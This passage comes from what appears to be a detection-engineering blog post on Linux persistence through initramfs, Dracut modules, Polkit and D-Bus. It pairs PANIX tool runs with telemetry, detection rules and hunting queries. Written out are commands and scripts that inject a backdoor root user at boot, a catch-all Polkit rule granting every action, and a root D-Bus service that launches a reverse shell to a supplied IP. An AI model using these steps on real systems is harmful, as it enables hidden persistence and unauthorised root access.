unmkinitramfs failed\"; exit 1; }\n```\n\nOnce the filesystem is extracted, it can be modified to achieve persistence. This process focuses on manipulating the `init` file, which is responsible for initializing the Linux system during boot. The code performs the following:\n\n1. Mount the root filesystem as writable.  \n2. Attempt to create a new user with sudo privileges in two steps:  \n   1. Check whether the supplied user exists already, if yes, abort.  \n   2. If the user does not exist, add the user to `/etc/shadow`, `/etc/passwd` and `/etc/group` manually.\n\nThis payload can be altered to whatever payload is desired. As the environment in which we are working is very limited, we need to make sure to only use tools that are available. \n\nAfter adding the correct payload, initramfs can be repacked. The script uses:\n\n`find . | sort | cpio -R 0:0 -o -H newc | gzip \u003e ../../initrd.img-end`\n\nTo repack the filesystem into `initrd.img-end`. It ensures all files are owned by `root:root` (`-R 0:0`) and uses the `newc` format compatible with initramfs.\n\nThe previously extracted microcode archive (`initrd.img-begin`) is concatenated with the newly created archive (`initrd.img-end`) using `cat` to produce a final `initrd.img-new`:\n\n`cat initrd.img-begin initrd.img-end \u003e initrd.img-new`\n\nThe new `initrd.img-new` replaces the original initramfs file, ensuring the system uses the modified version on the next boot.\n\nNow that we understand the process, we can run the module and let the events unfold. Note: not all Linux distributions specify the end of a `cpio` archive with the `TRAILER!!!` string, and therefore this automated technique will not work for all systems. Let’s continue!\n\n```\n\u003e sudo ./panix.sh --initramfs --binwalk --username panix --password panix --snapshot yes\n[*] Will inject user 'panix' with hashed password '\u003chash\u003e' into the initramfs.\n[*] Preparing Binwalk-based initramfs persistence...\n[*] Temporary directory: /tmp/initramfs.neg1v5\n[+] Backup created: /boot/initrd.img-5.15.0-130-generic.bak\n[*] Trailer address: 8057008\n[+] Binwalk-based initramfs persistence applied. New initramfs installed.\n[+] setup_initramfs module completed successfully.\n[!] Ensure you have a recent snapshot of your system before proceeding.\n```\n\nLet’s take a look at the events that are generated in Kibana:\n\n![PANIX Initramfs module execution visualized in Kibana - Binwalk method](/assets/images/the-grand-finale-on-linux-persistence/image6.png)\n\nLooking at the execution logs, we can see that `openssl` is used to generate a `passwd` hash. Afterwards, the initramfs image is copied to a temporary directory, and `binwalk` is leveraged to find the address of the filesystem. Once the correct section is found, `unmkinitramfs` is called to extract the filesystem, after which the payload is added to the `init` file. Next, the filesystem is repacked through `gzip` and `cpio`, and combined into a fully working initramfs image with the microcode, filesystem and other sections. This image is then copied to the `/boot/` directory, overwriting the currently active `initramfs` image. Upon reboot, the new `panix` user with root permissions is available. \n\nLet’s take a look at the coverage:\n\n*Detection and endpoint rules that cover manual initramfs persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Potential Memory Seeking Activity](https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules_building_block/discovery_potential_memory_seeking_activity.toml) |\n|         | [Initramfs Unpacking via unmkinitramfs](https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_unpack_initramfs_via_unmkinitramfs.toml) |\n|         | [Initramfs Extraction via CPIO](https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_extract_initramfs_via_cpio.toml) |\n|         | [Boot File Copy](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_boot_file_copy.toml) |\n|         | [OpenSSL Password Hash Generation](https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_openssl_passwd_hash_generation.toml) |\n\nYou can revert the changes made by PANIX by running the following revert command:\n\n```\n\u003e ./panix.sh --revert initramfs\n\n[!] Restoring initramfs from backup: $initrd_backup...\n[+] Initramfs restored successfully.\n[!] Rebuilding initramfs to remove modifications...\n[+] Initramfs rebuilt successfully.\n[!] Cleaning up temporary files...\n[+] Temporary files cleaned up.\n[+] Initramfs persistence reverted successfully.\n```\n\n# Hunting for T1542 - Initramfs: Manual Modifications\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use of tools like `binwalk`. This technique typically involves extracting, analyzing, and modifying initramfs files to inject malicious components or scripts into the boot process. The approach includes monitoring for the following:\n\n1. **Execution of Binwalk with Suspicious Arguments**: Tracks processes where `binwalk` is executed to extract or analyze files. This can reveal attempts to inspect or tamper with initramfs contents.  \n2. **Creations and/or Modifications to Initramfs Files**: Tracks changes to the initramfs file (`/boot/initrd.img`).  \n3. **General Kernel Manipulation Indicators**: Leverages queries such as monitoring `secureboot`, `kernel_info`, and file changes within `/boot/` to detect broader signs of kernel and bootloader manipulation, which may overlap with initramfs abuse.\n\nBy combining the [Persistence via Initramfs](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_initramfs.toml) and [General Kernel Manipulation](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1542](https://attack.mitre.org/techniques/T1542/).\n\n# T1542 - Initramfs: Modifying with Dracut\n\n[Dracut](https://wiki.archlinux.org/title/Dracut) is a versatile tool for managing initramfs in most Linux systems. Unlike manual methods that require deconstructing and reconstructing initramfs, Dracut provides a structured, modular approach. It simplifies creating, modifying, and regenerating initramfs images while offering a robust framework to add custom functionality. It generates initramfs images by assembling a minimal Linux environment tailored to the system's needs. Its modular design ensures that only the necessary drivers, libraries, and scripts are included.\n\nDracut operates through modules, which are self-contained directories containing scripts, configuration files, and dependencies. These modules define the behavior and content of the initramfs. For example, they might include drivers for specific hardware, tools for handling encrypted filesystems, or custom logic for pre-boot operations.\n\nDracut modules are typically stored in:\n\n* `/usr/lib/dracut/modules.d/`  \n* `/lib/dracut/modules.d/`\n\nEach module resides in a directory named in the format `XXname`, where `XX` is a two-digit number defining the load order, and `name` is the module name (e.g., `01base`, `95udev`).\n\nThe primary script that defines how the module integrates into the initramfs is called `module-setup.sh`. It specifies which files to include and what dependencies are required. Here is a basic example of a `module-setups.sh` script:\n\n```\n#!/bin/bash\n\ncheck() {\n  return 0 \n}\n\ndepends() {\n  echo \"base\"\n}\n\ninstall() {\n  inst_hook cmdline 30 \"$moddir/my_custom_script.sh\"\n  inst_simple /path/to/needed/binary\n}\n```\n\n* `check()`: Determines whether the module should be included. Returning 0 ensures the module is always included.  \n* `depends()`: Specifies other modules this one depends on (e.g., `base`, `udev`).  \n* `install()`: Defines what files or scripts to include. Functions like `inst_hook` and `inst_simple` simplify the process.\n\nUsing Dracut, attackers or administrators can easily modify initramfs to include custom scripts or functionality. For example, a malicious actor might:\n\n* Add a script that executes commands on boot.  \n* Alter existing modules to modify system behavior before the root filesystem is mounted.\n\nIn the next section, we’ll walk through creating a custom Dracut module to modify initramfs.\n\n# Persistence through T1542 - Initramfs: Modifying with Dracut\n\nIt is always a great idea to walk before we run. In the previous section we learnt how to manipulate initramfs manually, which can be difficult to set up. Now that we understand the basics, we can persist much easier by using a helper tool called Dracut, which is available by default on many Linux systems. Let’s take a look at the [setup_initramfs.sh](https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_initramfs.sh) module again, but this time with a focus on the Dracut section.\n\nThis PANIX module creates a new Dracut module directory at `/usr/lib/dracut/modules.d/99panix`, and creates a `module-setup.sh` file with the following contents:\n\n```\n#!/bin/bash\ncheck()  { return 0; }\ndepends() { return 0; }\ninstall() {\n\tinst_hook pre-pivot 99 \"$moddir/backdoor-user.sh\"\n}\n```\n\nThis script ensures that when the initramfs is built using Dracut, the custom script (`backdoor-user.sh`) is embedded and configured to execute at the pre-pivot stage during boot. By running at the pre-pivot stage, the script executes before control is handed over to the main OS, ensuring it can make modifications to the real root filesystem.\n\nAfter granting `module-setup.sh` execution permissions, the module continues to create the `backdoor-user.sh` file. To view the full content, inspect the module source code. The important parts are:\n\n```\n#!/bin/sh\n\n# Remount the real root if it's read-only\nmount -o remount,rw /sysroot 2\u003e/dev/null || {\n\techo \"[dracut] Could not remount /sysroot as RW. Exiting.\"\n\texit 1\n}\n[...]\n\nif check_user_exists \"${username}\" /sysroot/etc/shadow; then\n    echo \"[dracut] User '${username}' already exists in /etc/shadow.\"\nelse\n    echo \"${username}:${escaped_hash}:19000:0:99999:7:::\" \u003e\u003e /sysroot/etc/shadow\n    echo \"[dracut] Added '${username}' to /etc/shadow.\"\nfi\n\n[...]\n```\n\nFirst, the script ensures that the root filesystem (`/sysroot`) is writable. If this check completes, the script continues to add a new user by manually modifying the `/etc/shadow`, `/etc/passwd` and `/etc/group` files. The most important thing to notice is that these scripts rely on built-in shell utilities, as utilities such as `grep` or `sed` are not available in this environment. After writing the script, it is granted execution permissions and is good to go.\n\nFinally, Dracut is called to rebuild initramfs for the kernel version that is currently active:\n\n`dracut --force /boot/initrd.img-$(uname -r) $(uname -r)`\n\nOnce this step completes, the modified initramfs is active, and rebooting the machine will result in the `backdoor-user.sh` script being executed.\n\nAs always, first we take a snapshot, then we run the module:\n\n```\n\u003e sudo ./panix.sh --initramfs --dracut --username panix --password secret --snapshot yes\n[!] Will inject user 'panix' with hashed password \u003chash\u003e into the initramfs.\n[!] Preparing Dracut-based initramfs persistence...\n[+] Created dracut module setup script at /usr/lib/dracut/modules.d/99panix/module-setup.sh\n[+] Created dracut helper script at /usr/lib/dracut/modules.d/99panix/backdoor-user.sh\n[*] Rebuilding initramfs with dracut...\n[...]\ndracut: *** Including module: panix ***\n[...]\n[+] Dracut rebuild complete.\n[+] setup_initramfs module completed successfully.\n[!] Ensure you have a recent snapshot/backup of your system before proceeding.\n```\n\nAnd take a look at the documents available in Discover:\n\n![PANIX Initramfs module execution visualized in Kibana - Dracut method](/assets/images/the-grand-finale-on-linux-persistence/image5.png)\n\nUpon execution, `openssl` is used to create a password hash for the `secret` password. Afterwards, the directory structure `/usr/lib/dracut/modules.d/99panix` is created, and the `module-setup.sh` and `backdoor-user.sh` scripts are created and granted execution permissions. After regeneration of the initramfs completes, the backdoor has been planted, and will be active upon reboot.\n\nLet’s take a look at the coverage:\n\n*Detection and endpoint rules that cover dracut initramfs persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [Dracut Module Creation](https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_dracut_module_creation.toml) |\n|      | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Manual Dracut Execution](https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_manual_dracut_execution.toml) |\n|         | [OpenSSL Password Hash Generation](https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_openssl_passwd_hash_generation.toml) |\n|         | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml) |\n\nYou can revert the changes made by PANIX by running the following revert command:\n\n```\n\u003e ./panix.sh --revert initramfs\n\n[-] No backup initramfs found at /boot/initrd.img-5.15.0-130-generic.bak. Skipping restore.\n[!] Removing custom dracut module directory: /usr/lib/dracut/modules.d/99panix...\n[+] Custom dracut module directory removed.\n[!] Rebuilding initramfs to remove modifications...\n[...]\n[+] Initramfs rebuilt successfully.\n[!] Cleaning up temporary files...\n[+] Temporary files cleaned up.\n[+] Initramfs persistence reverted successfully.\n```\n\n# Hunting for T1542 - Initramfs: Modifying with Dracut\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use of tools like Dracut. The approach includes monitoring for the following:\n\n1. **Execution of Dracut with Suspicious Arguments**: Tracks processes where Dracut is executed to regenerate or modify initramfs files, especially with non-standard arguments. This can help identify unauthorized attempts to modify initramfs.  \n2. **Creations and/or Modifications to Dracut Modules**: Monitors changes within `/lib/dracut/modules.d/` and `/usr/lib/dracut/modules.d/`, which store custom and system-wide Dracut modules. Unauthorized modifications here may indicate attempts to persist malicious functionality.  \n3. **General Kernel Manipulation Indicators**: Utilizes queries like monitoring `secureboot`, `kernel_info`, and file changes within `/boot/` to detect broader signs of kernel and bootloader manipulation that could be related to Initramfs abuse.\n\nBy combining the [Persistence via Initramfs](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_initramfs.toml) and [General Kernel Manipulation](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml) hunting rules and the tailored detection queries listed above, you can effectively identify and respond to [T1542](https://attack.mitre.org/techniques/T1542/).\n\n# T1543 - Create or Modify System Process: PolicyKit\n\n[PolicyKit (or Polkit)](https://linux.die.net/man/8/polkit) is a system service that provides an authorization framework for managing privileged actions in Linux systems. It enables fine-grained control over system-wide privileges, allowing non-privileged processes to interact with privileged ones securely. Acting as an intermediary between system services and users, Polkit determines whether a user is authorized to perform specific actions. For instance, it governs whether a user can restart network services or install software without requiring full sudo permissions.\n\nPolkit authorization is governed by rules, actions, and authorization policies:\n\n* **Actions**: Defined in XML files (`.policy`), these specify the operations Polkit can manage, such as [`org.freedesktop.systemd1.manage-units`](https://www.freedesktop.org/software/systemd/man/latest/org.freedesktop.systemd1.html).  \n* **Rules**: JavaScript-like files (`.rules`) determine how authorization is granted for specific actions. They can check user groups, environment variables, or other conditions.  \n* **Authorization Policies**: `.pkla` files set default or per-user/group authorizations for actions, determining whether authentication is required.\n\nThe configuration files used by Polkit are found in several different locations, depending on the version of Polkit that is present on the system, and the Linux distribution that is active. The main locations you should know about:\n\n* Action definitions:  \n  * `/usr/share/polkit-1/actions/`  \n* Rule definitions:   \n  * `/etc/polkit-1/rules.d/`  \n  * `/usr/share/polkit-1/rules.d/`  \n* Authorization definitions:  \n  * `/etc/polkit-1/localauthority/`  \n  * `/var/lib/polkit-1/localauthority/`\n\nA Polkit `.rules` file defines the logic for granting or denying specific actions. These files provide flexibility in determining whether a user or process can execute an action. Here’s a simple example:\n\n```\npolkit.addRule(function(action, subject) {\n    if (action.id == \"org.freedesktop.systemd1.manage-units\" \u0026\u0026\n        subject.isInGroup(\"servicemanagers\")) {\n        return polkit.Result.YES;\n    }\n    return polkit.Result.NOT_HANDLED;\n});\n```\n\nIn this rule:\n\n* The action `org.freedesktop.systemd1.manage-units` (managing `systemd` services) is granted to users in the `servicemanagers` group.  \n* Other actions fall back to default handling.\n\nThis structure allows administrators to implement custom policies, but it also opens the door for attackers who can insert overly permissive rules to gain unauthorized privileges.\n\nCurrently, Polkit does not have a dedicated technique in the MITRE ATT\u0026CK framework. The closest match is [T1543: Create or Modify System Process](https://attack.mitre.org/techniques/T1543/), which describes adversaries modifying system-level processes to achieve persistence or privilege escalation.\n\nIn the next section, we will explore step-by-step how attackers can craft and deploy malicious Polkit rules and authorization files, while also discussing detection and mitigation strategies.\n\n# Persistence through T1543 - Create or Modify System Process: PolicyKit\n\nNow that we understand the theory, let’s take a look at how to simulate this in practice through the [setup_polkit.sh](https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_polkit.sh) PANIX module. First, the module checks the active Polkit version through the `pkaction --version` command, as versions \\\u003c 0.106 use the older `.pkla` files, while newer versions (\\\u003e= 0.106) use the more recent `.rules` files. Depending on the version, the module will continue to create the Polkit policy that is overly permissive. For versions \\\u003c 0.106 a `.pkla` file is created in `/etc/polkit-1/localauthority/50-local.d/`:\n\n```\nmkdir -p /etc/polkit-1/localauthority/50-local.d/\n\n# Write the .pkla file\ncat \u003c\u003c-EOF \u003e /etc/polkit-1/localauthority/50-local.d/panix.pkla\n[Allow Everything]\nIdentity=unix-user:*\nAction=*\nResultAny=yes\nResultInactive=yes\nResultActive=yes\nEOF\n```\n\nAllowing any `unix-user` to do any action through the `Identity=unix-user:*` and `Action=*` parameters.\n\nFor versions \\\u003e= 0.106 a `.rules` file is created in `/etc/polkit-1/rules.d/`:\n\n```\nmkdir -p /etc/polkit-1/rules.d/\n\n# Write the .rules file\ncat \u003c\u003c-EOF \u003e /etc/polkit-1/rules.d/99-panix.rules\npolkit.addRule(function(action, subject) {\n\treturn polkit.Result.YES;\n});\nEOF\n```\n\nWhere an overly permissive policy always returns `polkit.Result.YES`, which means that any action that requires Polkit’s authentication will be allowed by anyone.\n\nPolkit rules are processed in lexicographic (ASCII) order, meaning files with lower numbers load first, and later rules can override earlier ones. If two rules modify the same policy, the rule with the higher number takes precedence because it is evaluated last. To ensure the rule is executed and overrides others, PANIX creates it with a filename starting with 99 (e.g. `99-panix.rules`).\n\nLet’s run the PANIX module with the following command line arguments:\n\n```\n\u003e sudo ./panix.sh --polkit\n\n[!] Polkit version \u003c 0.106 detected. Setting up persistence using .pkla files.\n[+] Persistence established via .pkla file.\n[+] Polkit service restarted.\n[!] Run pkexec su - to test the persistence.\n```\n\nAnd take a look at the logs in Kibana:\n\n![PANIX Polkit module execution visualized in Kibana](/assets/images/the-grand-finale-on-linux-persistence/image2.png)\n\nUpon execution of PANIX, we can see the `pkaction --version` command being issued to determine whether a `.pkla` or `.rules` file approach is needed. After figuring this out, the correct policy is created, and the `polkit` service is restarted (this is not always necessary however). Once these policies are in place, a user with a `user.Ext.real.id` of `1000` (not-root) is capable of obtaining root privileges by executing the `pkexec su -` command. \n\nLet’s take a look at our detection opportunities:\n\n*Detection and endpoint rules that cover Polkit persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [Polkit Policy Creation](https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_polkit_policy_creation.toml) |\n|      | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Polkit Version Discovery](https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/discovery_polkit_version_discovery.toml) |\n|         | [Unusual Pkexec Execution](https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/execution_unusual_pkexec_execution.toml) |\n\nTo revert any changes, you can use the corresponding revert module by running:\n\n```\n\u003e ./panix.sh --revert polkit\n\n[+] Checking for .pkla persistence file...\n[+] Removed file: /etc/polkit-1/localauthority/50-local.d/panix.pkla\n[+] Checking for .rules persistence file...\n[-] .rules file not found: /etc/polkit-1/rules.d/99-panix.rules\n[+] Restarting polkit service...\n[+] Polkit service restarted successfully.\n```\n\n# Hunting for T1543 - Create or Modify System Process: PolicyKit\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the modification of PolicyKit configuration files and rules. The approach includes hunting for the following:\n\n1. **Creations and/or Modifications to PolicyKit Configuration Files**: Tracks changes in critical directories containing custom and system-wide rules, action descriptions and authorizations rules. Monitoring these paths helps identify unauthorized additions or tampering that could indicate malicious activity.  \n2. **Metadata Analysis of PolicyKit Files**: Inspects file ownership, access times, and modification timestamps for PolicyKit-related files. Unauthorized changes or files with unexpected ownership can indicate an attempt to persist or escalate privileges through PolicyKit.  \n3. **Detection of Rare or Anomalous Events**: Identifies uncommon file modification or creation events by analyzing process execution and correlation with file activity. This helps surface subtle indicators of compromise.\n\nBy combining the [Persistence via PolicyKit](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_policykit.toml) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1543](https://attack.mitre.org/techniques/T1543/).\n\n# T1543 - Create or Modify System Process: D-Bus\n\n[D-Bus (Desktop Bus)](https://linux.die.net/man/1/dbus-daemon) is an [inter-process communication (IPC)](https://www.geeksforgeeks.org/inter-process-communication-ipc/) system widely used in Linux and other Unix-like operating systems. It serves as a structured message bus, enabling processes, system services, and applications to communicate and coordinate actions. As a cornerstone of modern Linux environments, D-Bus provides the framework for both system-wide and user-specific communication.\n\nAt its core, D-Bus facilitates interaction between processes by providing a standardized mechanism for sending and receiving messages, eliminating the need for custom IPC solutions while improving efficiency and security. It operates through two primary communication channels:\n\n* **System Bus**: Used for communication between system-level services and privileged operations, such as managing hardware or network configuration.  \n* **Session Bus**: Used for communication between user-level applications, such as desktop notifications or media players.\n\nA D-Bus daemon manages the message bus, ensuring messages are routed securely between processes. Processes register themselves on the bus with unique names and provide interfaces containing methods, signals, and properties for other processes to interact with. The core components of D-Bus communication looks as follows:\n\n**Interfaces**:\n\n* Define a collection of methods, signals, and properties a service offers.  \n* Example: [`org.freedesktop.NetworkManager`](https://networkmanager.dev/docs/api/latest/gdbus-org.freedesktop.NetworkManager.html) provides methods to manage network connections.\n\n**Methods**:\n\n* Allow external processes to invoke specific actions or request information.  \n* Example: The method `org.freedesktop.NetworkManager.Reload` can be called to reload a network service.\n\n**Signals**:\n\n* Notifications sent by a service to inform other processes about events.  \n* Example: A signal might indicate a network connection status change.\n\nAs an example, the following command sends a message to the system bus to invoke the `Reload` method on the `NetworkManager` service:\n\n```\ndbus-send --system --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Reload uint32:0\n```\n\nD-Bus services are applications or daemons that register themselves on the bus to provide functionality. If a requested service is not running, the D-Bus daemon can start it automatically using predefined service files.\n\nThese services use service files with a `.service` extension to tell D-Bus how to start a service. For example:\n\n```\n[D-BUS Service]\nName=org.freedesktop.MyService\nExec=/usr/bin/my-service\nUser=root\n```\n\nD-Bus service files can be located in several different locations, depending on whether these services are running system-wide or at the user-level, and depending on the architecture and Linux distribution. The following is an overview of locations that are used, which is not an exhaustive list, as different distributions use different default locations:\n\n1. **System-wide Configuration and Services**:  \n   * System service files:  \n     * `/usr/share/dbus-1/system-services/`  \n     * `/usr/local/share/dbus-1/system-services/`  \n   * System policy files:  \n     * `/etc/dbus-1/system.d/`  \n     * `/usr/share/dbus-1/system.d/`  \n   * System configuration files:  \n     * `/etc/dbus-1/system.conf`  \n     * `/usr/share/dbus-1/system.conf`  \n2. **Session-wide Configuration and Services**:  \n   * Session service files:  \n     * `/usr/share/dbus-1/session-services/`  \n     * `~/.local/share/dbus-1/services/`  \n   * Session policy files:  \n     * `/etc/dbus-1/session.d/`  \n     * `/usr/share/dbus-1/session.d/`  \n   * Session configuration files:  \n     * `/etc/dbus-1/session.conf`  \n     * `/usr/share/dbus-1/session.conf`\n\nMore details on each path is available [here](https://dbus.freedesktop.org/doc/dbus-daemon.1.html). D-Bus policies, written in XML, define access control rules for D-Bus services. These policies specify who can perform actions such as sending messages, receiving responses, or owning specific services. They are essential for controlling access to privileged operations and ensuring that services are not misused. There are several key components to a D-Bus policy:\n\n1. **Context**:  \n* Policies can apply to specific users, groups, or a default context (`default` applies to all users unless overridden).  \n2. **Allow/Deny Rules**:  \n* Rules explicitly grant (`allow`) or restrict (`deny`) access to methods, interfaces, or services.  \n3. **Granularity**:  \n* Policies can control access at multiple levels:  \n  * Entire services (e.g., `org.freedesktop.MyService`).  \n  * Specific methods or interfaces (e.g., `org.freedesktop.MyService.SecretMethod`).\n\nThe following example demonstrates a D-Bus policy that enforces clear access restrictions:\n\n```\n\u003c!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\"\n  \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e\n\u003cbusconfig\u003e\n    \u003c!-- Default policy: Deny all access --\u003e\n    \u003cpolicy context=\"default\"\u003e\n        \u003cdeny send_destination=\"org.freedesktop.MyService\"/\u003e\n    \u003c/policy\u003e\n\n    \u003c!-- Allow only users in the \"admin\" group to access specific methods --\u003e\n    \u003cpolicy group=\"admin\"\u003e\n        \u003callow send_interface=\"org.freedesktop.MyService.PublicMethod\"/\u003e\n    \u003c/policy\u003e\n\n    \u003c!-- Allow root to access all methods --\u003e\n    \u003cpolicy user=\"root\"\u003e\n        \u003callow send_destination=\"org.freedesktop.MyService\"/\u003e\n    \u003c/policy\u003e\n\u003c/busconfig\u003e\n```\n\nThis policy:\n\n1. Denies all access to the service `org.freedesktop.MyService` by default.  \n2. Grants users in the `admin` group access to a specific interface (`org.freedesktop.MyService.PublicMethod`).  \n3. Grants full access to the `org.freedesktop.MyService` destination for the `root` user.\n\nD-Bus’s central role in IPC makes it a potential interesting target for attackers. Potential attack vectors include:\n\n1. **Hijacking or Registering Malicious Services**:  \n   * Attackers can replace or add `.service` files in e.g. `/usr/share/dbus-1/system-services/` to hijack legitimate communication or inject malicious code.  \n2. **Creating or Exploiting Over-permissive Policies**:  \n   * Weak policies (e.g., granting all users access to critical services) can allow attackers to invoke privileged methods.  \n3. **Abusing Vulnerable Services**:  \n   * If a D-Bus service improperly validates input, attackers may execute arbitrary code or perform unauthorized actions.\n\nThe examples above can be used for privilege escalation, defense evasion and persistence. Currently, there is no specific MITRE ATT\u0026CK sub-technique for D-Bus. However, its abuse aligns closely with [T1543: Create or Modify System Process](https://attack.mitre.org/techniques/T1543/), as well as [T1574: Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/) for cases where `.service` files are modified.\n\nIn the next section we will take a look at how an attacker can set up overly permissive D-Bus configurations that send out reverse connections with root permissions, while discussing approaches to detecting this behavior. \n\n# Persistence through T1543 - Create or Modify System Process: D-Bus\n\nNow that we've learnt all about D-Bus setup, it’s time to take a look at how to simulate this in practice through the [setup_dbus.sh](https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_dbus.sh) PANIX module. PANIX starts off by creating a D-Bus service file at `/usr/share/dbus-1/system-services/org.panix.persistence.service` with the following contents:\n\n```\ncat \u003c\u003c'EOF' \u003e \"$service_file\"\n[D-BUS Service]\nName=org.panix.persistence\nExec=/usr/local/bin/dbus-panix.sh\nUser=root\nEOF\n```\n\nThis service file will listen on the `org.panix.persistence` interface, and execute the `/usr/local/bin/dbus-panix.sh` “service”. The `dbus-panix.sh` script simply invokes a reverse shell connection when called:\n\n```\ncat \u003c\u003cEOF \u003e \"$payload_script\"\n#!/bin/bash\n# When D-Bus triggers this service, execute payload.\n${payload}\nEOF\n```\n\nTo ensure any user is allowed to invoke the actions corresponding to the interface, PANIX sets up a `/etc/dbus-1/system.d/org.panix.persistence.conf` file with the following contents:\n\n```\ncat \u003c\u003c'EOF' \u003e \"$conf_file\"\n\u003c!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\"\n\t\"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e\n\u003cbusconfig\u003e\n\t\u003c!-- Allow any user to own, send to, and access the specified service --\u003e\n\t\u003cpolicy context=\"default\"\u003e\n\t\t\u003callow own=\"org.panix.persistence\"/\u003e\n\t\t\u003callow send_destination=\"org.panix.persistence\"/\u003e\n\t\t\u003callow send_interface=\"org.panix.persistence\"/\u003e\n\t\u003c/policy\u003e\n\u003c/busconfig\u003e\nEOF\n```\n\nThis configuration defines a D-Bus policy that permits any user or process to own, send messages to, and interact with the `org.panix.persistence` service, effectively granting unrestricted access to it. After restarting the `dbus` service, the setup is complete.\n\nTo interact with the service, the following command can be used:\n\n```\ndbus-send --system --type=method_call /\n--dest=org.panix.persistence /org/panix/persistence /\norg.panix.persistence.Method\n```\n\nThis command sends a method call to the D-Bus system bus, targeting the `org.panix.persistence` service, invoking the `org.panix.persistence.Method` method on the `/org/panix/persistence` object, effectively triggering the backdoor. \n\nLet’s run the PANIX module with the following command line arguments:\n\n```\n\u003e sudo ./panix.sh --dbus --default --ip 192.168.1.100 --port 2016\n\n[+] Created/updated D-Bus service file: /usr/share/dbus-1/system-services/org.panix.persistence.service\n[+] Created/updated payload script: /usr/local/bin/dbus-panix.sh\n[+] Created/updated D-Bus config file: /etc/dbus-1/system.d/org.panix.persistence.conf\n[!] Restarting D-Bus...\n[+] D-Bus restarted successfully.\n[+] D-Bus persistence module completed. Test with:\n\ndbus-send --system --type=method_call --print-reply /\n--dest=org.panix.persistence /org/panix/persistence /\norg.panix.persistence.Method\n```\n\nUpon execution of the `dbus-send` command:\n\n```\ndbus-send --system --type=method_call --print-reply /\n--dest=org.panix.persistence /org/panix/persistence /\norg.panix.persistence.Method\n```\n\nWe will take a look at the documents in Kibana:\n\n![PANIX D-Bus module execution visualized in Kibana](/assets/images/the-grand-finale-on-linux-persistence/image4.png)\n\nUpon PANIX execution, the `org.panix.persistence.service`, `dbus-panix.sh`, and `org.panix.persistence.conf` files are created, successfully setting the stage. Afterwards, the `dbus` service is restarted, and the dbus-send command is executed to interact with the `org.panix.persistence` service. Upon invocation of the `org.panix.persistence.Method` method, the `dbus-panix.sh` backdoor is executed, and the reverse shell connection chain (`dbus-panix.sh` → `nohup` → `setsid` → `bash`) is initiated.\n\nLet’s take a look at our detection opportunities:\n\n*Detection and endpoint rules that cover D-Bus persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [D-Bus Service Created](https://github.com/elastic/detection-rules/blob/fb13b89f8d277ee78d4027a8014ad67023aa167c/rules/linux/persistence_dbus_service_creation.toml) |\n|      | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Suspicious D-Bus Method 